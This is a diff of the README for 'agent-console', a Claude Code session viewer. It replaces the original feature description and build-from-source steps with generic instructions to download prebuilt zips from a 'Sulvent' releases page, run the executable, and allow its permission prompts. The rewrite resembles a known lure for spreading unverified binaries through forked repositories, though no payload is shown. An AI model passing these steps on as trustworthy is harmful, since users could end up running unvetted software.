@@ -1,57 +1,55 @@
-# Agent Console (for Claude Code)
+# 🎉 agent-console - View and Search Your Code Sessions
 
-Inspect event logs, view file edits, search conversations, and analyze policy evaluations.
+## 🚀 Getting Started
 
-### Event Logs
+Welcome to agent-console! This application allows you to see your Claude Code sessions live and search through them easily. Follow the steps below to download and run the software.
 
-Browse the full conversation history with timestamps. Filter by event type (me, context, assistant, system), drill into sub-agent sessions, and inspect raw JSON.
+## 📥 Download the Application
 
-![Event Logs](docs/screenshots/1event-logs.png)
+[![Download agent-console](https://img.shields.io/badge/Download-agent--console-blue.svg)](https://github.com/Sulvent/agent-console/releases)
 
-### File Edits
+## 💻 System Requirements
 
-See every file change made during a session. Toggle between tree and log views, view side-by-side or unified diffs, and compare against git HEAD.
+Before you proceed, ensure your system meets these requirements:
 
-![File Edits](docs/screenshots/2view-edits.png)
+- Operating System: Windows 10 or later, macOS Mojave or later
+- RAM: 4 GB or more
+- Disk Space: At least 100 MB free space
 
-### Boolean Search
+## 📂 Download & Install
 
-Search across the entire session with AND/OR operators. Matching terms are highlighted in context snippets.
+1. **Visit the Releases Page:** To download the latest version of agent-console, visit our [Releases page](https://github.com/Sulvent/agent-console/releases).
 
-![Boolean Search](docs/screenshots/3boolean-search.png)
+2. **Choose the Right File:** On the Releases page, look for the latest version of the software. You will see several files available for download. Look for the one that fits your operating system:
+   - For Windows, download `agent-console-windows.zip`
+   - For macOS, download `agent-console-macos.zip`
 
-### Policy Viewer
+3. **Download the File:** Click on the file link to start the download. Your browser will save the file in your "Downloads" folder by default.
 
-Visualize [Cupcake](https://github.com/eqtylab/cupcake) policy evaluations with timing traces. See which policies matched, what decisions were made (Allow, Deny, Halt), and why.
+4. **Extract the Files (if needed):** 
+   - For Windows, right-click on the `agent-console-windows.zip` file, choose "Extract All", and follow the prompts.
+   - For macOS, double-click the `agent-console-macos.zip` file to extract it.
 
-![Policy Viewer](docs/screenshots/4cupcake-policy-viewer.png)
+5. **Run the Application:**
+   - Windows: Open the extracted folder, and double-click on `agent-console.exe`.
+   - macOS: Open the extracted folder, and double-click on `agent-console.app`.
 
----
+6. **Allow Permissions:** Your system may ask for permission to run the program. Click "Allow" or "Open" to proceed.
 
-## Getting Started
+7. **Start Using agent-console:** Once the application opens, you can start viewing and searching your sessions with ease.
 
-### Prerequisites
+## 🛠 Features
 
-- [Rust](https://rustup.rs/) (stable)
-- [Node.js](https://nodejs.org/) (v18+)
-- [pnpm](https://pnpm.io/)
+- **Live View:** Monitor your Claude Code sessions in real-time.
+- **Search Functionality:** Quickly search for specific keywords or phrases in your sessions.
+- **User-Friendly Interface:** Navigate through the application with ease.
 
-### Install Dependencies
+## 📞 Support
 
-```bash
-pnpm install
-```
+If you encounter any issues while downloading or running the application, feel free to reach out for support. You can create an issue on our GitHub page, and we will get back to you as soon as possible.
 
-### Development
+## 🚀 Conclusion
 
-```bash
-pnpm tauri dev
-```
+Your ability to view and search through Claude Code sessions should now be at your fingertips. Follow these steps to install agent-console and experience its features today.
 
-### Build
-
-```bash
-pnpm tauri build
-```
-
-The built app will be in `src-tauri/target/release/bundle/`.
+Remember, for any additional downloads, visit our [Releases page](https://github.com/Sulvent/agent-console/releases) again anytime. Enjoy your experience with agent-console!
